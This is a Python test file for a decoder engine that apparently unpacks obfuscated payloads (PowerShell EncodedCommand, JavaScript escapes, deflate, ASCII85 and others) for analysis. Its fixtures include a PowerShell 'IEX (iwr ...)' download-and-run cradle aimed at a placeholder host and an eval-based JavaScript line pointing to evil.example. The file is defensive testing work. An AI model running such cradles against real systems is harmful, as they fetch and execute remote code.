"""Regression and safety tests for the advanced transport decoders."""

import base64
import zlib

from titan_decoder.core.engine import TitanEngine
from titan_decoder.decoders.advanced import (
    Ascii85Decoder,
    Base58Decoder,
    Base91Decoder,
    BrotliDecoder,
    JavaScriptEscapeDecoder,
    PowerShellEncodedCommandDecoder,
    RawDeflateDecoder,
    ZstandardDecoder,
)


def test_ascii85_requires_explicit_framing():
    decoder = Ascii85Decoder()
    wrapped = base64.a85encode(b"http://ascii85.example/payload", adobe=True)
    assert decoder.decode(wrapped) == (b"http://ascii85.example/payload", True)
    assert decoder.can_decode(b"ordinary words that happen to be printable") is False


def test_raw_deflate_round_trip_and_output_bound():
    source = b"raw deflate payload http://deflate.example/a" * 4
    compressor = zlib.compressobj(wbits=-zlib.MAX_WBITS)
    encoded = compressor.compress(source) + compressor.flush()
    assert RawDeflateDecoder().decode(encoded) == (source, True)
    assert RawDeflateDecoder(max_output=8).decode(encoded) == (encoded, False)


def test_raw_deflate_rejects_input_that_is_not_one_complete_stream():
    decoder = RawDeflateDecoder()
    # Ordinary JSON text whose first bytes coincidentally form a complete
    # DEFLATE stream must not "decode": the remaining bytes land in
    # unused_data and prove the match was accidental.
    metadata = (
        b'{\n  "analyzer": "script",\n  "deobfuscated_artifacts": [\n'
        b'    "powershell_decoded.txt"\n  ],\n  "execution_performed": false,\n'
        b'  "features": [\n    "obfuscation"\n  ],\n  "languages": [\n'
        b'    "powershell"\n  ]\n}'
    )
    assert decoder.can_decode(metadata) is False
    assert decoder.decode(metadata) == (metadata, False)
    # A genuine stream followed by trailing bytes is rejected for the same
    # reason, while the bare stream still decodes.
    compressor = zlib.compressobj(wbits=-zlib.MAX_WBITS)
    encoded = compressor.compress(b"payload http://deflate.example/b")
    encoded += compressor.flush()
    assert decoder.decode(encoded) == (b"payload http://deflate.example/b", True)
    padded = encoded + b"trailing"
    assert decoder.decode(padded) == (padded, False)


def test_powershell_encoded_command_extracts_utf16le():
    command = "IEX (iwr 'http://powershell.example/stage.ps1')"
    encoded = base64.b64encode(command.encode("utf-16-le")).decode("ascii")
    payload = f"powershell.exe -NoProfile -EncodedCommand {encoded}".encode()
    decoder = PowerShellEncodedCommandDecoder()
    assert decoder.can_decode(payload)
    decoded, success = decoder.decode(payload)
    assert success and decoded.decode() == command


def test_javascript_obfuscation_is_normalized_without_execution():
    payload = b"eval(String.fromCharCode(104,116,116,112)+':%2f%2fevil.example')"
    decoded, success = JavaScriptEscapeDecoder().decode(payload)
    assert success
    assert b"http://evil.example" in decoded


def test_base58_and_base91_require_meaningful_output():
    assert Base58Decoder().decode(b"JxF12TrwUP45BMd") == (b"Hello World", True)
    assert Base91Decoder().decode(b">OwJh>Io0Tv!8PE") == (b"Hello World!", True)
    for decoder in (Base58Decoder(), Base91Decoder()):
        assert decoder.can_decode(b"short") is False


def test_optional_compression_decoders_fail_closed_when_unavailable_or_invalid():
    brotli_payload = b"brotli:not-a-stream"
    brotli_output, brotli_success = BrotliDecoder().decode(brotli_payload)
    assert isinstance(brotli_output, bytes)
    assert isinstance(brotli_success, bool)

    zstd_payload = b"\x28\xb5\x2f\xfdnot-a-frame"
    assert ZstandardDecoder().can_decode(zstd_payload)
    assert ZstandardDecoder().decode(zstd_payload) == (zstd_payload, False)


def test_advanced_decoders_are_registered_and_name_sorted():
    engine = TitanEngine()
    names = [decoder.name for decoder in engine.decoders]
    assert names == sorted(names)
    assert {
        "ASCII85",
        "Base58",
        "Base91",
        "Brotli",
        "JavaScriptEscape",
        "PowerShellEncodedCommand",
        "RawDeflate",
        "Zstandard",
    } <= set(names)
